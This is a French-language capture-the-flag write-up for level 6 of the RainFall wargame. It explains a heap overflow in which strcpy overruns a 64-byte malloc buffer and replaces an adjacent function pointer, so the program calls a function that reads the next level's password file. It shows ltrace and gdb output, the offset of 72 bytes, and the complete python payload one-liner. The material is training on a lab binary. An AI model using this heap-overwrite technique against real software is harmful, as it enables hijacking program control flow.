# level6

Ici on a une fonction main qui alloue sur la heap un espace de 64 bytes suivi d'un espace de 4 bytes 
Qui copie notre argv[1] dans le buffer alloue par malloc avec strcpy

ltrace ./level6

level6@RainFall:~$ ltrace ./level6 3
__libc_start_main(0x804847c, 2, 0xbffff7e4, 0x80484e0, 0x8048550 <unfinished ...>
malloc(64)                             = 0x0804a008
malloc(4)                              = 0x0804a050
strcpy(0x0804a008, "3")                = 0x0804a008
puts("Nope"Nope
)                           = 5
+++ exited (status 5) +++

Avec ltrace on a les adresses de retour des malloc

En faisant un print de la memoire sur l'adresse 0x0804a008 on s'apercoit que les blocs de deux malloc se suivent 

(gdb) x/s 0x0804a008
0x804a008:       'A' <repeats 70 times>
(gdb) x/32wx 0x0804a008
0x804a008:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a028:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a038:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a048:      0x41414141      0x00004141      0x08048468      0x00000000

Donc on comprend que les deux blocs memoire allouer par malloc se suivent sur la heap
On va devoir ecraser l'adresse de m() (08048468) qui est dans le malloc de 4 par l'adresse de n() (08048454) pour que lorsque le programme va call *eax il va donc appeler n() qui fait appel system("/bin/cat /home/user/level7/.pass")

Donc il suffit de trouver l'offset entre le debut du buffer et ou on ecrase l'adresse du malloc(4)

Offset : 72
Ecart de 8 ???? HEADER MALLOC ??????

Sur gdb on peut donner un parametre via cette commande :
set args $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')

en ligne de commande on peut 
./level6   $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
ou
level6@RainFall:~$ ./level6   `python -c 'print "A"*72 + "\x54\x84\x04\x08"'`
Pour qu'il execute la commande python en premier et qu'il l'a prenne comme argument sinon c'est envoyer sur stdin mais ce n'est pas ce que l'on veut